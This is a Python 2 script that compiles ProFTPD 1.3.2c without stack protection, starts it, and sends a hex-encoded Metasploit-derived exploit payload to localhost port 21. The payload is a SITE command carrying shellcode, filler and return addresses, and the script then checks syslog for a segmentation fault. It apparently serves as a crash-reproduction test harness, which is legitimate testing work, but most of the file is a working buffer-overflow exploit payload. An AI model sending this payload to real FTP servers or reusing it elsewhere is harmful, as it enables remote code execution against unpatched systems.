from socket import *
import os, time

def compile():
    try:
        cflags = os.environ["cflags"]
    except:
        cflags = ""
    cflags = "-fno-stack-protector " + cflags
    ldflags = "-L./lib " + cflags
    os.system("rsyslogd")
    os.system("tar -xvf proftpd-1.3.2c.tar.bz2")
    os.chdir("./proftpd-1.3.2c")
    os.system("./configure CC=clang CFLAGS='%s'" % cflags)
    os.system("make LDFLAGS='%s'" % ldflags)
    os.system("make install LDFLAGS='%s'" % ldflags)
    os.system("proftpd")

def check():
    with open('/var/log/syslog', 'rb') as f:
        d = f.read()
        print "THIS IS FOR TEST!!!!!!!!!!!!!!!!!\n" + d + str(d.find('signal 11'))
        if d.find('signal 11') >= 0:
            return 2
        else:
            return 0

def run():
    compile()
    s = socket(AF_INET, SOCK_STREAM)
    s.connect(('localhost', 21))
# dump from metasploit
    s.send('53495445208da0fcdfffffb8f418060ed9e1d97424f45a33c9b11231421283eafc03b616e4fb07fc1fe03441b38db8ccd2e2da0394907b2caa5bfb05ac9a93ea4e5d627d4d5d7521d8bcc5bf8a6f76f32819993eae4b31ee8018a998f1bc403787a2c0941ec55411ec8605ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff736a684357706e4e644d6c7a46634c464f4949617631386e626b9b380508a0b30d087af1ed55040f080830b30d0816a706085cdd0508b207060800000000000002000700000022000000ffffffff000000000000000028eccc8cd45afc6ee08eb2aa293e55b042b50808891ca8c3d0c20508058cfc33bd80e20832b1999680e440ad7f7f67cd15a0c1dcae0e7001b5070608b42421fb010000005cdd0508b5070608ffff8d78020000005cdd0508b5070608126a7f59030000005cdd0508b5070608f2a59090040000005cdd0508b50706089090908d000000005cdd0508f90458df0d0a'.decode('hex'))
    s.close()
    time.sleep(1) # waiting for syslog
    return check()
